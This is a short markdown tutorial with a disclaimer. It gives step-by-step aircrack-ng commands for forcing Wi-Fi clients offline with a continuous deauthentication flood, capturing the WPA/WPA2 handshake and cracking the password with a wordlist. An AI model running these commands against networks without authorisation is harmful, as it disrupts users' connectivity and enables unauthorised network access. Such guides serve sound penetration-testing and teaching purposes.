# Deauthentication Attack and Wi-Fi Password Cracking using aircrack-ng

## Disclaimer
**WARNING: Unauthorized access to computer networks is illegal and unethical. This guide is intended for educational purposes only and should only be used on networks for which you have explicit permission. Misuse of this information can lead to severe legal consequences.**

## Prerequisites
- A computer with a compatible wireless network adapter that supports monitor mode.
- `aircrack-ng` suite installed.
- Root or sudo access.

## Step 1: Install aircrack-ng
To install the `aircrack-ng` suite, use the following commands:

```bash
# Update package lists
sudo apt update

# Install aircrack-ng
sudo apt install aircrack-ng

#Step 2: Set Wireless Interface to Monitor Mode
Find your wireless interface name and set it to monitor mode.
# List network interfaces
sudo iwconfig

# Stop any process that could interfere with monitor mode
sudo airmon-ng check kill

# Start monitor mode on your wireless interface (e.g., wlan0)
sudo airmon-ng start wlan0

# Verify that the interface is now in monitor mode (e.g., wlan0mon)
sudo iwconfig

#Step 3: Capture Traffic with airodump-ng
# Start capturing packets on the monitor mode interface
sudo airodump-ng wlan0mon

# Note the BSSID (MAC address) and channel of the target network
#Step 4: Deauthentication Attack with aireplay-ng
Send deauthentication packets to disconnect clients from the target network, forcing them to reconnect and capture the handshake.

# Deauthenticate a specific client
sudo aireplay-ng --deauth 0 -a <BSSID> -c <Client_MAC> wlan0mon

# Deauthenticate all clients from the target network
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon

#Step 5: Capture the WPA/WPA2 Handshake
# Capture the handshake by specifying the BSSID and channel
sudo airodump-ng -c <Channel> --bssid <BSSID> -w capture wlan0mon

# Look for "WPA handshake" in the airodump-ng output

#Step 6: Crack the Password with aircrack-ng
# Run aircrack-ng with the captured handshake file and a wordlist
sudo aircrack-ng -w /path/to/wordlist.txt -b <BSSID> capture-01.cap


